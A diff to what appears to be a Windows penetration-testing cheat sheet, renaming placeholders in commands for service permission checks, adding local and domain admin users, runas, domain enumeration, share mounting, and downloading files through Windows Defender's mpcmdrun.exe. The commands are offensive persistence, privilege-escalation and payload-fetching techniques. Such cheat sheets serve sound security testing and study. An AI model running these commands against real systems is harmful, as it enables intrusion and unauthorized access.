@@ -149,7 +149,7 @@ vssadmin list shadows
 
 ## check service privilege
 ```
-accesschk.exe /accepteula -ucqv <service_name>
+accesschk.exe /accepteula -ucqv <SERVICE>
 ```
 
 ## reconfigure service
@@ -169,12 +169,12 @@ net start <SERVICE>
 
 ## check permission (1)
 ```
-accesschk.exe /accepteula -dqv '<file>'
+accesschk.exe /accepteula -dqv '<FILE>'
 ```
 
 ## check permission (2)
 ```
-cacls '<file>'
+cacls '<FILE>'
 ```
 
 ## find weak folder permission
@@ -200,13 +200,13 @@ echo var WinHttpReq = new ActiveXObject('WinHttp.WinHttpRequest.5.1');WinHttpReq
 ## add user
 #cat/PERSIST
 ```
-net user <username> <password> /ADD
+net user <username> <PASSWORD> /ADD
 ```
 
 ## add user to domain
 #cat/PERSIST
 ```
-net user <username> <password> /ADD /DOMAIN
+net user <username> <PASSWORD> /ADD /DOMAIN
 ```
 
 ## add user as admin
@@ -218,7 +218,7 @@ net localgroup administrators <username> /add
 ## run as over user
 #cat/PRIVESC
 ```
-runas /user:<domain>\<user> cmd.exe
+runas /user:<DOMAIN>\<USER> cmd.exe
 ```
 
 ## whoami - All info about me, take a look at the enabled tokens
@@ -334,7 +334,7 @@ net view /domain
 
 ## list domain controllers
 ```
-nltest /dclist:<domain>
+nltest /dclist:<DOMAIN>
 ```
 
 ## list pc accounts of domain controllers
@@ -412,7 +412,7 @@ type C:\WINDOWS\System32\drivers\etc\hosts
 
 ## list hidden files
 ```
-dir /a:h <path>
+dir /a:h <PATH>
 ```
 
 ## Recursive list
@@ -478,12 +478,12 @@ net view /all /domain <domain_name>
 
 ## list share of a computer
 ```
-net view \\<ip> \ALL
+net view \\<IP> \ALL
 ```
 
 ## mount share locally
 ```
-net use x: \\<ip>\<share_name>
+net use x: \\<IP>\<share_name>
 ```
 
 ## check current share
@@ -494,12 +494,12 @@ net share
 % windows, file, download
 ## windows download file with windows defender
 ```
-'c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe' -DownloadFile -url <url> -path <result_file>
+'c:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\mpcmdrun.exe' -DownloadFile -url <URL> -path <result_file>
 ```
 
 ## windows download file with windows defender
 ```
-mpcmdrun.exe -DownloadFile -url <url> -path <result_file>
+mpcmdrun.exe -DownloadFile -url <URL> -path <result_file>
 ```
 
 % windows, active directory, dns
